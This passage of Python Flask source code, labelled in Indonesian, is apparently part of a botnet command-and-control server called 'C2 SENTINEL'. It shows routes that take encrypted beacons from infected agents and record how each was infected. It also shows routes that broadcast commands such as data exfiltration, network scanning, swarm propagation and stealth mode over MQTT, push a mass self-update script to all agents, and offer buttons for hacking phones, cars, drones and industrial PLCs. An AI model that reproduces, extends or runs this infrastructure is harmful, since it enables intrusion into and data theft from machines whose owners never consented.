            const tubeGeometry = new THREE.TubeGeometry(curve, 20, 0.5, 8, false);
            const tubeMaterial = new THREE.MeshPhongMaterial({{
                color: 0x5c4a3d,
                emissive: 0x5c4a3d,
                emissiveIntensity: 0.5,
                transparent: true,
                opacity: 0.8
            }});
            const tube = new THREE.Mesh(tubeGeometry, tubeMaterial);
            scene.add(tube);
            lines.push(tube);
        }});

        camera.position.set(0, 0, 300);
        camera.lookAt(0, 0, 0);

        const controls = new THREE.OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;
        controls.dampingFactor = 0.1;
        controls.rotateSpeed = 0.5;

        let autoRotate = true;
        const toggleAutoRotate = () => {{
            autoRotate = !autoRotate;
            controls.autoRotate = autoRotate;
            controls.autoRotateSpeed = 0.5;
        }};
        renderer.domElement.addEventListener('dblclick', toggleAutoRotate);

        function animate() {{
            requestAnimationFrame(animate);
            particleSystem.rotation.y += 0.0005;
            spheres.forEach((sphere, i) => {{
                const scale = 1 + Math.sin(Date.now() * 0.003 + i) * 0.1;
                sphere.scale.set(scale, scale, scale);
            }});
            lines.forEach((line, i) => {{
                line.material.opacity = 0.5 + Math.sin(Date.now() * 0.002 + i) * 0.3;
            }});
            controls.update();
            renderer.render(scene, camera);
        }}
        animate();

        window.addEventListener('resize', () => {{
            camera.aspect = container.clientWidth / container.clientHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(container.clientWidth, container.clientHeight);
        }});

        const info = document.createElement('div');
        info.style.position = 'absolute';
        info.style.top = '10px';
        info.style.left = '10px';
        info.style.color = '#b8860b';
        info.style.fontFamily = 'monospace';
        info.style.padding = '10px';
        info.style.backgroundColor = 'rgba(44, 38, 32, 0.7)';
        info.style.border = '1px solid #b8860b';
        info.innerHTML = '<h4>🖱️ Controls:</h4><p>- Drag: Rotate<br>- Scroll: Zoom<br>- Double Click: Toggle Auto-Rotate</p>';
        container.appendChild(info);
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/agents')
def agents_live():
    now = datetime.now()
    agents_html = ""
    for agent_id in AGENT_LAST_SEEN.keys():
        last_seen = AGENT_LAST_SEEN[agent_id]
        status = "online" if (now - last_seen).total_seconds() < 300 else "offline"
        AGENT_STATUS[agent_id] = status
        time_str = last_seen.strftime("%Y-%m-%d %H:%M:%S")
        gen = AGENT_SWARM_MAP.get(agent_id, {}).get("generation", 0)
        via = AGENT_SWARM_MAP.get(agent_id, {}).get("infected_via", "manual")
        sev_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{via}</span>'

        agents_html += f'''
        <div style="border: 1px solid var(--border-paper); margin: 15px 0; padding: 15px; background: rgba(255,255,255,0.8);">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                <div>
                    <b style="font-size: 1.1em;">{agent_id}</b> 
                    <span class="status-{status}">● {status.upper()}</span>
                    {sev_tag}
                </div>
                <div style="color: var(--text-secondary); font-size: 0.9em;">
                    {time_str}
                </div>
            </div>
            <div style="margin-top: 10px;">
                <a href="/command?agent={agent_id}"><button style="margin-right: 10px;">🎯 Command</button></a>
                <a href="/reports?agent={agent_id}"><button>📄 Reports</button></a>
            </div>
        </div>
        '''

    content = f'''
    <h2>👾 AGENT LIVE MONITOR — REAL-TIME STATUS & CONTROL</h2>
    <div class="card">
        <p><strong>🟢 Total Agent Terdaftar:</strong> {len(AGENT_LAST_SEEN)}</p>
        <p><strong>📡 Online (5 menit terakhir):</strong> {sum(1 for s in AGENT_STATUS.values() if s == "online")}</p>
        <p><strong>💤 Offline:</strong> {sum(1 for s in AGENT_STATUS.values() if s == "offline")}</p>
    </div>

    <div class="card">
        <h3>📋 Daftar Agent ({len(AGENT_LAST_SEEN)} Agent)</h3>
        {agents_html if agents_html else "<p style='color: var(--alert-maroon);'>Belum ada agent terdaftar.</p>"}
    </div>

    <script>
        setInterval(() => {{
            fetch('/agents').then(r => r.text()).then(html => {{
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const newContent = doc.querySelector('.container').innerHTML;
                document.querySelector('.container').innerHTML = newContent;
            }});
        }}, 5000);
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/command', methods=['GET', 'POST'])
def command_center():
    if request.method == 'POST':
        agent_id = request.form.get('agent_id', '').strip()
        cmd = request.form.get('command', '').strip()
        note = request.form.get('note', '').strip()
        data_json = request.form.get('data', '{}')

        if not agent_id or not cmd:
            return jsonify({"error": "Agent ID dan command wajib diisi"}), 400

        try:
            data = json.loads(data_json)
        except:
            data = {}

        command_data = {
            "cmd": cmd,
            "note": note,
            "data": data,
            "timestamp": datetime.now().isoformat(),
            "issued_by": "manual"
        }

        if agent_id.lower() == "all":
            # Kirim ke semua agent
            count = 0
            for aid in AGENT_LAST_SEEN.keys():
                ACTIVE_COMMANDS[aid] = command_data.copy()
                if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                    topic = f"c2/agent/{aid}/cmd"
                    payload = json.dumps(ACTIVE_COMMANDS[aid])
                    MQTT_CLIENT.publish(topic, payload, qos=1)
                count += 1
            result = f"Command berhasil dikirim ke {count} agent"
        else:
            ACTIVE_COMMANDS[agent_id] = command_data

            if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                topic = f"c2/agent/{agent_id}/cmd"
                payload = json.dumps(command_data)
                MQTT_CLIENT.publish(topic, payload, qos=1)
                print(f"[MQTT] → {topic}: {payload}")
                result = "Command berhasil dikirim via MQTT"
            else:
                result = "Command disimpan — tunggu agent check-in (MQTT tidak tersedia)"

        return jsonify({"success": True, "message": result})

    agent_id = request.args.get('agent', '').strip()
    agent_options = "".join([f'<option value="{aid}">{aid} ({AGENT_STATUS.get(aid, "unknown")})</option>' for aid in AGENT_LAST_SEEN.keys()])

    content = f'''
    <h2>🎯 COMMAND CENTER — KIRIM PERINTAH KE AGENT</h2>
    <div class="card">
        <form method="POST">
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Pilih Agent:</label>
                <select name="agent_id" required>
                    <option value="">-- Pilih Agent --</option>
                    <option value="all">[ALL AGENTS]</option>
                    {agent_options}
                </select>
            </div>
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Command:</label>
                <select name="command" required>
                    <option value="idle">🔄 idle - Mode standby</option>
                    <option value="scan">🔍 scan - Deep network scan</option>
                    <option value="exfil">📤 exfil - Data exfiltration</option>
                    <option value="update">🆙 update - Self-update agent</option>
                    <option value="kill">💀 kill - Self-destruct</option>
                    <option value="swarm_activate">🕸️ swarm_activate - Activate neural propagation</option>
                    <option value="web_swarm_only">🌐 web_swarm_only - Web zombie hunter only</option>
                    <option value="silent_mode">👻 silent_mode - Stealth operation</option>
                    <option value="set_generation">🧬 set_generation - Set swarm generation</option>
                    <!-- ✅ BARU: Hardware Commands -->
                    <option value="mobile_control">📱 mobile_control - Hack smartphone</option>
                    <option value="car_hack">🚗 car_hack - Hack car</option>
                    <option value="arduino_control">🤖 arduino_control - Hack Arduino/ESP32</option>
                    <option value="drone_hijack">🛸 drone_hijack - Hijack drone</option>
                    <option value="plc_hack">🏭 plc_hack - Hack industrial PLC</option>
                    <option value="planetary_takeover">🌍 planetary_takeover - Launch apocalypse</option>
                </select>
            </div>
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Data (JSON - opsional):</label>
                <textarea name="data" rows="4" placeholder='{{"target_ip": "192.168.1.100", "device_type": "Android"}}' style="width: 100%; padding: 10px; border: 1px solid var(--border-paper); background: rgba(255,255,255,0.9);">{{}}</textarea>
            </div>
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Catatan (Opsional):</label>
                <input type="text" name="note" placeholder="Contoh: target CEO's iPhone" style="width: 100%; padding: 10px; border: 1px solid var(--border-paper); background: rgba(255,255,255,0.9);">
            </div>
            <button type="submit" style="background: var(--alert-maroon); color: white; border: 2px solid var(--alert-maroon);">🚀 KIRIM PERINTAH — OMNIVERSE CONFIRMED</button>
        </form>
    </div>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/reports')
def list_reports():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()

        export_links = '''
        <p>
            <a href="/export?format=json"><button>💾 Export JSON</button></a>
            <a href="/export?format=csv"><button>📊 Export CSV</button></a>
        </p>
        '''

        formatted_reports = []
        for r in reports[:50]:
            severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
            sev_class = "tag-high" if is_high_severity(r) else ""
            gen_tag = ""
            if r.get("type") == "swarm_infection":
                gen = r.get("data", {}).get("generation", 0)
                method = r.get("data", {}).get("method", "")
                gen_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{method}</span>'
            # ✅ BARU: Hardware tag
            elif r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
                hw_type = r.get("type", "").replace("_", " ").title()
                gen_tag = f'<span class="tag tag-hardware">{hw_type}</span>'

            formatted_reports.append(f'''
<div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#8b0000' if is_high_severity(r) else '#b8860b'}; background: rgba(255,255,255,0.8);">
    <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
        <div><b>Agent:</b> {r.get("id", "unknown")}</div>
        <div><span class="tag {sev_class}">{severity}</span> {gen_tag}</div>
    </div>
    <div><b>Type:</b> {r.get("type", "beacon")}</div>
    <div><b>Target:</b> {r.get("data", {}).get("target", "N/A")}</div>
    <div><small><b>Time:</b> {r.get("timestamp", "N/A")} | IP: {r.get("beacon_ip", "N/A")}</small></div>
</div>
            ''')

        content = f'''
        <h2>📁 LAPORAN AGENT — OMNIVERSE ARCHIVE</h2>
        {export_links}
        <div class="terminal" id="reportTerminal">
            {"".join(formatted_reports) if formatted_reports else "<i style='color: var(--text-secondary);'>Belum ada laporan.</i>"}
        </div>
        {export_links}
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
    except Exception as e:
        return f"<h2>❌ Error</h2><pre>{e}</pre>"

@app.route('/export')
def export_reports():
    fmt = request.args.get('format', 'json')
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if fmt == 'csv':
            import csv
            from io import StringIO
            output = StringIO()
            writer = csv.writer(output)
            if reports:
                keys = reports[0].keys()
                writer.writerow(keys)
                for r in reports:
                    writer.writerow([r.get(key, "") for key in keys])
            output.seek(0)
            return output.getvalue(), 200, {
                'Content-Type': 'text/csv',
                'Content-Disposition': 'attachment; filename=reports.csv'
            }
        else:
            return jsonify(reports)
    except Exception as e:
        return str(e), 500

@app.route('/logs')
def live_logs():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()
        logs = []
        for r in reports[:100]:
            ts = r.get("timestamp", "N/A")
            agent = r.get("id", "unknown")
            issue = r.get("issue", "N/A")
            rtype = r.get("type", "beacon")
            severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
            sev_color = "#8b0000" if is_high_severity(r) else "#b8860b"
            logs.append(f'<span style="color:{sev_color};">[{ts}]</span> <b>[{agent}]</b> {severity} | Type: {rtype} | {issue}')

        content = f'''
        <h2>📜 LIVE LOGS — OMNIVERSE FEED</h2>
        <div class="terminal" id="logTerminal">
            <div id="logContent" style="color:#b8860b; font-family: 'Courier New';">
                {"".join(f"<div>{log}</div>" for log in logs) if logs else "<i>Belum ada log.</i>"}
            </div>
        </div>
        <p><small>Real-time update via WebSocket — no refresh needed.</small></p>
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
    except Exception as e:
        return str(e)

@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted_data = request.form.get('data')
    if not encrypted_data:
        return "Invalid", 400

    decrypted = xor_decrypt(encrypted_data)
    if not decrypted:
        return "Forbidden", 403

    try:
        data = json.loads(decrypted)
        agent_id = data.get("id", "unknown")
        data["timestamp"] = datetime.now().isoformat()
        data["beacon_ip"] = request.remote_addr

        AGENT_LAST_SEEN[agent_id] = datetime.now()

        if agent_id not in AGENT_SWARM_MAP:
            existing_agents = list(AGENT_SWARM_MAP.keys())
            parent = random.choice(existing_agents) if existing_agents else "ROOT"
            swarm_gen = data.get("system", {}).get("swarm_generation", 0)
            infected_via = data.get("system", {}).get("infected_via", "manual")
            AGENT_SWARM_MAP[agent_id] = {
                "parent": parent,
                "children": [],
                "ip": data.get("ip", "unknown"),
                "first_seen": data["timestamp"],
                "generation": swarm_gen,
                "infected_via": infected_via
            }
            if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                AGENT_SWARM_MAP[parent]["children"].append(agent_id)

        with open(REPORT_FILE, "r+") as f:
            try:
                reports = json.load(f)
                if not isinstance(reports, list):
                    reports = []
            except:
                reports = []
            reports.append(data)
            if len(reports) > MAX_REPORTS:
                reports = reports[-MAX_REPORTS:]
            f.seek(0)
            json.dump(reports, f, indent=2, ensure_ascii=False)
            f.truncate()

        if is_high_severity(data):
            alert = f"🚨 <b>BUG KRITIS DITEMUKAN!</b>\n"
            alert += f"🆔 Agent: {agent_id}\n"
            alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
            alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
            alert += f"🕒 Waktu: {data['timestamp']}"
            send_alert(alert)
            socketio.emit('new_alert', {"message": f"Critical issue found by {agent_id}: {data.get('issue', 'unknown')}"})

        cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
        if agent_id in ACTIVE_COMMANDS:
            del ACTIVE_COMMANDS[agent_id]

        online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items() 
                          if (datetime.now() - last_seen).total_seconds() < 300)
        socketio.emit('update_dashboard', {"agents_online": online_count})

        return jsonify(cmd)

    except Exception as e:
        print(f"[BEACON ERROR] {e}")
        return "Error", 500

# ✅ BARU: ROUTE UNTUK UPLOAD UPGRADE SCRIPT
@app.route('/upload_upgrade', methods=['GET', 'POST'])
def upload_upgrade():
    if request.method == 'POST':
        if 'file' in request.files:
            file = request.files['file']
            if file.filename.endswith('.py'):
                global AGENT_UPGRADE_SCRIPT
                AGENT_UPGRADE_SCRIPT = file.read().decode('utf-8')
                # Kirim ke semua agent aktif
                count = 0
                for agent_id in list(AGENT_LAST_SEEN.keys()):
                    if agent_id not in ACTIVE_COMMANDS:
                        ACTIVE_COMMANDS[agent_id] = {
                            "cmd": "update",
                            "note": "AUTO: Mass upgrade initiated from C2",
                            "timestamp": datetime.now().isoformat(),
                            "issued_by": "c2_admin"
                        }
                        if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                            topic = f"c2/agent/{agent_id}/cmd"
                            payload = json.dumps(ACTIVE_COMMANDS[agent_id])
                            MQTT_CLIENT.publish(topic, payload, qos=1)
                        count += 1
                return jsonify({"success": True, "message": f"Upgrade script uploaded and broadcasted to {count} agents"})
        return jsonify({"error": "Invalid file - must be .py"}), 400
    
    content = '''
    <h2>📤 UPLOAD UPGRADE SCRIPT — UPDATE SEMUA AGENT</h2>
    <div class="card">
        <form method="POST" enctype="multipart/form-data">
            <label>Upload agent.py baru:</label><br>
            <input type="file" name="file" accept=".py" required><br><br>
            <button type="submit" style="background: var(--accent-gold); color: white; border: 2px solid var(--accent-gold);">🚀 DEPLOY KE SEMUA AGENT — MASS UPGRADE</button>
        </form>
        <p><small>File akan dikirim ke semua agent aktif. Agent akan self-update otomatis.</small></p>
    </div>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

# ✅ BARU: ROUTE UNTUK HARDWARE CONTROL
@app.route('/hardware')
def hardware_control():
    content = '''
    <h2>🚗 HARDWARE APOCALYPSE CONTROL CENTER</h2>
    <div class="card">
        <h3>📱 Mobile Devices</h3>
        <button onclick="sendCommand('mobile_control', '192.168.1.100', 'Android')" style="margin: 5px;">Hack Android</button>
        <button onclick="sendCommand('mobile_control', '192.168.1.101', 'iOS')" style="margin: 5px;">Hack iPhone</button>
    </div>
    
    <div class="card">
        <h3>🚗 Cars</h3>
        <button onclick="sendCommand('car_hack', '192.168.0.10', 'Toyota')" style="margin: 5px;">Hack Toyota</button>
        <button onclick="sendCommand('car_hack', '192.168.0.11', 'Tesla')" style="margin: 5px;">Hack Tesla</button>
    </div>
    
    <div class="card">
        <h3>🛸 Drones</h3>
        <button onclick="sendCommand('drone_hijack', '192.168.1.101', 'DJI Mavic')" style="margin: 5px;">Hijack DJI</button>
    </div>
    
    <div class="card">
        <h3>🤖 Arduino/PLC</h3>
        <button onclick="sendCommand('arduino_control', '192.168.1.50', 'ESP32')" style="margin: 5px;">Hack ESP32</button>
        <button onclick="sendCommand('plc_hack', '192.168.2.50', 'Siemens S7')" style="margin: 5px;">Hack Factory</button>
    </div>

    <script>
    function sendCommand(cmd, target_ip, device_type) {
        const data = JSON.stringify({target_ip: target_ip, device_type: device_type});
        fetch('/command', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `agent_id=all&command=${cmd}&note=Hardware+target&data=${encodeURIComponent(data)}`
        })
        .then(r => r.json())
        .then(data => {
            alert('Command sent to all agents!');
        })
        .catch(err => {
            alert('Error sending command');
        });
    }
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/update')
def update():
    if AGENT_UPGRADE_SCRIPT:
        return AGENT_UPGRADE_SCRIPT, 200, {
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename=agent.py'
        }
    else:
        # Fallback ke versi default
        default_script = '''
print("✅ Agent updated to latest version")
import time
time.sleep(2)
print("🔄 Restarting...")
'''
        return default_script, 200, {
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename=agent.py'
        }

@app.route('/analytics')
def analytics():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)

    issue_types = {}
    targets = {}
    for r in reports[:200]:
        issue = r.get("issue", "Unknown")[:30]
        issue_types[issue] = issue_types.get(issue, 0) + 1
        target = r.get("target", "Unknown").split('/')[2] if '//' in r.get("target", "") else r.get("target", "Unknown")[:25]
        targets[target] = targets.get(target, 0) + 1

    issue_items = sorted(issue_types.items(), key=lambda x: x[1], reverse=True)[:10]
    target_items = sorted(targets.items(), key=lambda x: x[1], reverse=True)[:10]

    issue_labels = [item[0] for item in issue_items]
    issue_data = [item[1] for item in issue_items]
    target_labels = [item[0] for item in target_items]
    target_data = [item[1] for item in target_items]

    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <h2>📈 NEURAL ANALYTICS & PREDICTION ENGINE</h2>

    <div class="ai-insight">
        <h3>🧠 NEURAL AI EXECUTIVE SUMMARY</h3>
        <pre style="color:var(--accent-gold); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
        <p style="color: var(--alert-maroon); font-weight: bold; font-size: 1.2em;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
    </div>

    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
        <div class="card">
            <h3>📊 Top 10 Issue Types</h3>
            <div class="chart-container">
                <canvas id="issueChart"></canvas>
            </div>
        </div>
        <div class="card">
            <h3>🎯 Top 10 Targets</h3>
            <div class="chart-container">
                <canvas id="targetChart"></canvas>
            </div>
        </div>
    </div>

    <div class="card">
        <h3>📈 Agent Online Trend (60 Menit)</h3>
        <div class="chart-container">
            <canvas id="agentTrendChart"></canvas>
        </div>
    </div>

    <script>
        const issueCtx = document.getElementById('issueChart').getContext('2d');
        new Chart(issueCtx, {{
            type: 'bar',
             {{
                labels: {json.dumps(issue_labels)},
                datasets: [{{
                     {json.dumps(issue_data)},
                    backgroundColor: Array({len(issue_labels)}).fill().map((_, i) => `hsla(${{i * 36}}, 100%, 50%, 0.7)`),
                    borderColor: Array({len(issue_labels)}).fill().map((_, i) => `hsla(${{i * 36}}, 100%, 50%, 1)`),
                    borderWidth: 2
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ display: false }},
                    tooltip: {{
                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
                        titleColor: '#3b2f2f',
                        bodyColor: '#000000'
                    }}
                }},
                scales: {{
                    x: {{ 
                        ticks: {{ color: '#3b2f2f' }},
                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                    }},
                    y: {{ 
                        beginAtZero: true, 
                        ticks: {{ color: '#3b2f2f' }},
                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                    }}
                }},
                animation: {{
                    duration: 1500,
                    easing: 'easeOutBounce'
                }}
            }}
        }});

        const targetCtx = document.getElementById('targetChart').getContext('2d');
        new Chart(targetCtx, {{
            type: 'doughnut',
             {{
                labels: {json.dumps(target_labels)},
                datasets: [{{
                     {json.dumps(target_data)},
                    backgroundColor: [
                        'rgba(184, 134, 11, 0.8)',
                        'rgba(139, 69, 19, 0.8)',
                        'rgba(139, 0, 0, 0.8)',
                        'rgba(85, 107, 47, 0.8)',
                        'rgba(75, 0, 130, 0.8)',
                        'rgba(47, 79, 79, 0.8)',
                        'rgba(105, 105, 105, 0.8)',
                        'rgba(128, 0, 0, 0.8)',
                        'rgba(139, 0, 139, 0.8)',
                        'rgba(255, 140, 0, 0.8)'
                    ],
                    borderColor: '#3b2f2f',
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ 
                        labels: {{ 
                            color: '#3b2f2f',
                            font: {{ size: 12 }}
                        }}
                    }},
                    tooltip: {{
                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
                        titleColor: '#3b2f2f',
                        bodyColor: '#000000'
                    }}
                }},
                animation: {{
                    animateRotate: true,
                    animateScale: true,
                    duration: 2000
                }}
            }}
        }});

        const trendCtx = document.getElementById('agentTrendChart').getContext('2d');
        new Chart(trendCtx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#b8860b',
                    backgroundColor: 'rgba(184, 134, 11, 0.1)',
                    tension: 0.3,
                    pointBackgroundColor: '#8b0000',
                    pointBorderColor: '#ffffff',
                    pointRadius: 4,
                    fill: true
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ 
                        labels: {{ 
                            color: '#3b2f2f',
                            font: {{ size: 14 }}
                        }}
                    }},
                    tooltip: {{
                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
                        titleColor: '#3b2f2f',
                        bodyColor: '#000000'
                    }}
                }},
                scales: {{
                    x: {{ 
                        ticks: {{ color: '#3b2f2f' }},
                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                    }},
                    y: {{ 
                        beginAtZero: true, 
                        ticks: {{ color: '#3b2f2f' }},
                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                    }}
                }},
                animation: {{
                    duration: 2000,
                    easing: 'easeInOutQuart'
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=ai_insight.get("risk_score", 0))

# === SOCKET.IO EVENTS ===
@socketio.on('connect')
def handle_connect():
    print('Client connected to WebSocket')
    SOCKETS.append(request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in SOCKETS:
        SOCKETS.remove(request.sid)

# === RUN ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8000))
    print("="*70)
    print("🚀🚀🚀 C2 SENTINEL v14.0 — OMNIVERSE COMMAND CENTER")
    print(f"🌐 Running on http://0.0.0.0:{port}")
    print(f"🔐 XOR Key: '{XOR_KEY}'")
    print(f"📡 MQTT Broker: {MQTT_HOST}:{MQTT_PORT}")
    print("🤖 Neural AI + Auto Command + Swarm Map + 3D Vis + Hardware Control + Mass Upgrade — ALL ACTIVE")
    print("="*70)

    threading.Thread(target=init_mqtt, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)